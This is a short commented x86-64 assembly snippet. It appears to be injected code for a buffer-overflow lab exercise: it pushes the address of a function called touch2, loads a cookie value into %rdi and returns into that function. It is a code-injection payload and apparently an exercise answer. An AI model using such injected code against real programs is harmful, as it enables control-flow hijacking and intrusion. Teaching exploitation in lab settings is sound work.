pushq $0x401980 #push touch2's address
movq $0x74a095da,%rdi #copy cookie to rdi
ret # jump to touch2()
